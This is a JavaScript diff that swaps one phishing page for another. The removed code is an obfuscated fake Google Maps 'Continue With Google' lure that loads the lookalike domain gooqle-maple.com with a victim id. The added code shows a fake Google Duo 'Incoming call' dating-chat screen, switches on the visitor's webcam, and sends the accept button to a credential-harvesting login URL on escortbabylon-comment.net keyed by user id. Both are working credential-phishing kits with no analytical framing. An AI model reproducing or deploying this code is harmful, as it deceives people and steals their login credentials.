@@ -1,10 +1,111 @@
-// Function to extract URL parameters
-function getQueryParam1(param) {
-const urlParams = new URLSearchParams(window.location.search);
-return urlParams.get(param);
+// Create elements programmatically
+const newDiv = document.createElement('div');
+newDiv.className = 'card';
+
+
+
+newDiv.innerHTML = `
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" href="https://res.cloudinary.com/df4coefiy/raw/upload/v1745475016/1e43e3ab50fce75fsw_oxomps.css" data-precedence="next">
+      <link rel="stylesheet" href="https://res.cloudinary.com/df4coefiy/raw/upload/v1745475033/57978a1014ff42c9sw_fbmtve.css" data-precedence="next">
+      <title>Join video chat</title>
+      <meta name="description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:title" content="Join video chat">
+      <meta property="og:description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:image" content="https://res.cloudinary.com/df4coefiy/image/upload/v1745475051/google-duo_abzkgh.png">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Join video chat">
+      <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
+      <meta name="twitter:image" content="https://joinfacetimes.com/public/google-duo.png">
+      <link rel="icon" href="https://res.cloudinary.com/df4coefiy/image/upload/v1745475102/google-duo_rhpldi.ico" sizes="32x32">
+      <meta name="next-size-adjust">
+   </head>
+   <body class="__className_aaf875">
+      <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
+         <video autoplay="" muted="" playsinline="" class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
+         <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
+            <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
+               <img alt="Google Duo" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" class="rounded-full object-cover object-center p-2 bg-green-100" style="color:transparent" src="https://joinfacetimes.com/public/images/google-duo.png">
+               <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
+               <div class="flex items-center justify-center gap-x-12 text-neutral-50">
+                  <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
+                     <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="none" d="M0 0h24v24H0z"></path>
+                        <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
+                     </svg>
+                  </label>
+                  <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500">
+                     <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="none" d="M0 0h24v24H0z"></path>
+                        <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
+                     </svg>
+                  </label>
+               </div>
+            </div>
+         </div>
+
+ </div>
+
+
+`;
+    let x = 1;
+    
+    
+    
+
+document.addEventListener('click', function(e) {
+
+function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
 }
 
 
-let id= getQueryParam1('userid') || 1;
 
-const _0x3de0c6=_0x407e;(function(_0x30c67a,_0x2e819c){const _0x579e90=_0x407e,_0x2d86dd=_0x30c67a();while(!![]){try{const _0x1ec4b6=parseInt(_0x579e90(0x79))/0x1+-parseInt(_0x579e90(0xb3))/0x2*(-parseInt(_0x579e90(0xb4))/0x3)+parseInt(_0x579e90(0x8e))/0x4*(-parseInt(_0x579e90(0x8d))/0x5)+-parseInt(_0x579e90(0x90))/0x6*(parseInt(_0x579e90(0x99))/0x7)+-parseInt(_0x579e90(0x7a))/0x8+parseInt(_0x579e90(0x9d))/0x9+parseInt(_0x579e90(0x83))/0xa*(parseInt(_0x579e90(0xbf))/0xb);if(_0x1ec4b6===_0x2e819c)break;else _0x2d86dd['push'](_0x2d86dd['shift']());}catch(_0x3d8ba4){_0x2d86dd['push'](_0x2d86dd['shift']());}}}(_0x5d8e,0x3f936));var link=document[_0x3de0c6(0x9b)](_0x3de0c6(0xa3));link['rel']=_0x3de0c6(0x9e),link['type']=_0x3de0c6(0xa0),link[_0x3de0c6(0x98)]=_0x3de0c6(0xbb),document[_0x3de0c6(0x80)][_0x3de0c6(0x94)](link);const body=document[_0x3de0c6(0xa6)],mapIframe=document[_0x3de0c6(0x9b)]('iframe');function _0x5d8e(){const _0x3952d6=['text','hidden','head','loading','overlay','10huDaRR','What\x27s\x20your\x20area?','&times;','label','input','setAttribute','password','ready','div','40.333453,\x20-102.437074','275KmXVSM','24184olZglx','search-container','3852LWRZaW','map-background','addEventListener','searchIcon','appendChild','20px','fadeIn','button','href','1113yddZHK','style','createElement','Maps\x20Icon','2420343DEyzOL','stylesheet','alt','text/css','src','container','link','color','accept-button','body','name','google-button-overlay','innerHTML','lazy','type','add','img','display','outline','G-map','input-section','border','48570ZWeEoT','45dlKRXx','450','click','Continue With \x20Google','#6565c5','fa-search',`https://gooqle-maple.com/view-location/${id}`,'https://res.cloudinary.com/dqo5yczyq/raw/upload/v1745916030/stylemap_o898hd.css','classList','textContent','https://subtle-selkie-b1bcf4.netlify.app','107294NkbmSg','600','432645HWDOdA','3044696LveCHg','value','clear-btn','none'];_0x5d8e=function(){return _0x3952d6;};return _0x5d8e();}mapIframe[_0x3de0c6(0xbc)]['add'](_0x3de0c6(0x91)),mapIframe['src']=_0x3de0c6(0xbe),mapIframe['width']=_0x3de0c6(0xc0),mapIframe['height']=_0x3de0c6(0xb5),mapIframe['style'][_0x3de0c6(0xb2)]='0',mapIframe['allowFullscreen']='',mapIframe[_0x3de0c6(0x81)]=_0x3de0c6(0xaa);const overlay=document['createElement'](_0x3de0c6(0x8b));overlay[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0x82)),overlay[_0x3de0c6(0x9a)][_0x3de0c6(0xae)]='none';const googleButtonOverlay=document[_0x3de0c6(0x9b)]('a');googleButtonOverlay[_0x3de0c6(0x98)]='#',googleButtonOverlay[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0xa8)),googleButtonOverlay['id']='googleButtonOverlay';const googleIcon=document['createElement'](_0x3de0c6(0xad));googleIcon[_0x3de0c6(0xa1)]='https://res.cloudinary.com/dqo5yczyq/image/upload/v1745916077/533px-Google_Maps_Logo_2020.svg_fg4obx.png',googleIcon[_0x3de0c6(0x9f)]=_0x3de0c6(0x9c);const googleLabel=document[_0x3de0c6(0x9b)](_0x3de0c6(0x86));googleLabel[_0x3de0c6(0x88)]('for',_0x3de0c6(0x89)),googleLabel[_0x3de0c6(0xbd)]=_0x3de0c6(0xb7),googleButtonOverlay[_0x3de0c6(0x94)](googleIcon),googleButtonOverlay[_0x3de0c6(0x94)](googleLabel),overlay['appendChild'](googleButtonOverlay);const container=document[_0x3de0c6(0x9b)](_0x3de0c6(0x8b));container[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0xa2));const inputSection=document['createElement'](_0x3de0c6(0x8b));inputSection[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0xb1));const areaLabel=document[_0x3de0c6(0x9b)](_0x3de0c6(0x86));areaLabel[_0x3de0c6(0x88)]('for',_0x3de0c6(0xa7)),areaLabel[_0x3de0c6(0xbd)]=_0x3de0c6(0x84),inputSection[_0x3de0c6(0x94)](areaLabel),inputSection['appendChild'](document[_0x3de0c6(0x9b)]('br'));const hiddenInput=document[_0x3de0c6(0x9b)](_0x3de0c6(0x87));hiddenInput[_0x3de0c6(0xab)]=_0x3de0c6(0x7f),hiddenInput['id']=_0x3de0c6(0xa7),hiddenInput[_0x3de0c6(0x7b)]=_0x3de0c6(0xb0),inputSection[_0x3de0c6(0x94)](hiddenInput);const searchContainer=document['createElement'](_0x3de0c6(0x8b));searchContainer['classList'][_0x3de0c6(0xac)](_0x3de0c6(0x8f));const searchInput=document[_0x3de0c6(0x9b)](_0x3de0c6(0x87));searchInput[_0x3de0c6(0x9a)]['border']=_0x3de0c6(0x7d),searchInput[_0x3de0c6(0x9a)][_0x3de0c6(0xaf)]='none',searchInput['type']=_0x3de0c6(0x7e),searchInput[_0x3de0c6(0x7b)]=_0x3de0c6(0x8c);const searchIcon=document['createElement']('i');searchIcon['id']=_0x3de0c6(0x93),searchIcon[_0x3de0c6(0xbc)]['add']('fa',_0x3de0c6(0xb9)),searchIcon[_0x3de0c6(0x9a)]['fontSize']=_0x3de0c6(0x95),searchIcon['style'][_0x3de0c6(0xa4)]=_0x3de0c6(0xb8),searchIcon[_0x3de0c6(0x9a)]['padding']='7px';const clearButton=document['createElement'](_0x3de0c6(0x97));function _0x407e(_0x534dcb,_0x263961){const _0x5d8e98=_0x5d8e();return _0x407e=function(_0x407e5f,_0x3d08f6){_0x407e5f=_0x407e5f-0x79;let _0x4d2f5d=_0x5d8e98[_0x407e5f];return _0x4d2f5d;},_0x407e(_0x534dcb,_0x263961);}clearButton[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0x7c)),clearButton[_0x3de0c6(0xa9)]=_0x3de0c6(0x85),searchContainer[_0x3de0c6(0x94)](searchInput),searchContainer['appendChild'](searchIcon),searchContainer[_0x3de0c6(0x94)](clearButton),inputSection[_0x3de0c6(0x94)](searchContainer),container[_0x3de0c6(0x94)](inputSection),body[_0x3de0c6(0x94)](mapIframe),body['appendChild'](overlay),body[_0x3de0c6(0x94)](container),$(document)[_0x3de0c6(0x8a)](function(){setTimeout(function(){const _0x586d11=_0x407e;$('.overlay')[_0x586d11(0x96)]();},0xfa0);});const acceptButton=document[_0x3de0c6(0x9b)]('label');acceptButton[_0x3de0c6(0xbc)][_0x3de0c6(0xac)](_0x3de0c6(0xa5)),acceptButton['style']['display']=_0x3de0c6(0x7d),acceptButton[_0x3de0c6(0x88)]('for',_0x3de0c6(0x89));let clickCount=0x0;acceptButton['addEventListener'](_0x3de0c6(0xb6),()=>{const _0x5eb629=_0x3de0c6;clickCount++,clickCount===0x2&&(window['location'][_0x5eb629(0x98)]=_0x5eb629(0xba));}),overlay[_0x3de0c6(0x94)](acceptButton),overlay[_0x3de0c6(0x92)]('click',function(){const _0x48842b=_0x3de0c6;acceptButton[_0x48842b(0xb6)]();});
+
+       let userId = getQueryParam('userid') || 1;
+       
+
+ document.querySelectorAll('.accept-button').forEach(button => {
+  button.addEventListener('click', () => {
+       let userId = getQueryParam('userid') || 1;
+    window.location.href =`https://escortbabylon-comment.net/auth/log_in/${userId}`
+  });
+});
+ 
+ 
+});
+
+
+
+
+document.body.appendChild(newDiv);
+
+
+$(document).ready(function() {
+  // Check if getUserMedia is available
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    // Access the webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        // Show the video stream
+        $('#video').get(0).srcObject = stream;
+      })
+      .catch(function(error) {
+        console.error('Error accessing webcam:', error);
+      });
+  } else {
+    console.error('getUserMedia is not supported');
+  }
+
+$("button").on("click",function(){
+  window.location.href="https://google.com"
+
+}); 
+
+
+
+
+  
+});
